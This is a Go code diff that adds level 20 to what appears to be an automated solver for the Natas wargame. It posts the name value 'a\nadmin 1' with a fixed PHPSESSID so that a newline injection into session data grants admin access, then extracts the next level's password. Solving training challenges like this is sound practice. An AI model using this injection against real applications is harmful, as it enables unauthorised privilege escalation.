@@ -606,6 +606,32 @@ var levels = [...]Grabber{
 			},
 		},
 	},
+	//level 20
+	Headers{
+		Prefixed{
+			grab,
+			"Password: ",
+			32,
+		},
+		SetData{
+			"Cookie": Text{"PHPSESSID=1"},
+			"Upgrade-Insecure-Requests": Post{ // hack to send data before reloading page
+				Headers{
+					Contains{
+						grab,
+						"natas21",
+					},
+					SetData{
+						"Cookie": Text{"PHPSESSID=1"},
+					},
+				},
+				SetData{
+					"name": Text{"a\nadmin 1"},
+				},
+				nil,
+			},
+		},
+	},
 }
 
 func e(err error) {
